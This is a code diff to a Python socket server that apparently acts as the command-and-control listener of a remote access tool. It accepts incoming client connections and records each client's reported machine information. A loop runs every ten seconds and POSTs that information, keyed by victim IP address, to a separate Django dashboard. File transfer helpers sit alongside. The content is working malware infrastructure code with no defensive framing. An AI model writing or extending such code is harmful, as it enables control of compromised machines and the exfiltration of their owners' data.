@@ -3,11 +3,13 @@ import threading
 import time
 import json
 import base64
+import requests
 
 class Con_Stor():
     def __init__(self, client_socket_object, addr):
         self.client_socket_object = client_socket_object
         self.addr = addr
+        self.machine_info = self.json_receive()
 
     def json_send(self, data):
         for i in range(len(data)):
@@ -28,6 +30,14 @@ class Con_Stor():
             except:
                 continue
 
+ACTIVE_CONNECTIONS = []
+
+class Server:
+    def __init__(self, ip, port, django_server):
+        self.socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.socket_obj.bind((ip, port))
+        self.django_server = django_server
+
     def read_file(self, path):
         try:
             with open(path, 'rb') as file_obj:
@@ -41,11 +51,53 @@ class Con_Stor():
                 return "[+] File downloaded successfully"
         except:
             return "[+] ERROR - Error during creating a file"    
-            
-ACTIVE_CONNECTIONS = []
-
-class Server:
-    def __init__(self, ip, port):
-        self.socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket_obj.bind((ip, port))
         
+    def manage_listen_and_add(self):
+        print("[*] Listening for Incoming Connections")
+        self.socket_obj.listen(5)
+        
+        try:
+            while True:
+                client_conn_object, addr = self.socket_obj.accept()
+                con_stor = Con_Stor(client_socket_object=client_conn_object,
+                                    addr=addr)
+                ACTIVE_CONNECTIONS.append(con_stor)
+
+                print("[+] Received a connection from -> ", str(addr))
+                print(con_stor.machine_info)
+            
+        except KeyboardInterrupt:
+            print("[*] Closing Listener")
+
+
+    def manage_POST_connection_objects(self):
+        try:
+            while True:
+                data = {}
+                for connection in ACTIVE_CONNECTIONS:
+                    data[connection.addr[0]] = connection.machine_info
+
+                r = requests.post(url=self.django_server,
+                                data=data)
+                time.sleep(10)    
+        except KeyboardInterrupt:
+            print("[*] Closing POST func()")
+        
+def run_manager(ip, port, django_server):
+    obj = Server(ip=ip, port=port,
+                 django_server=django_server)
+    
+    listen_thread = threading.Thread(target=obj.manage_listen_and_add, daemon=True)
+    command_thead = threading.Thread(target=obj.manage_POST_connection_objects, daemon=True)
+
+    listen_thread.start()
+    command_thead.start()
+
+    listen_thread.join()
+    command_thead.join()
+
+    obj.socket_obj.close()
+
+
+    
+    
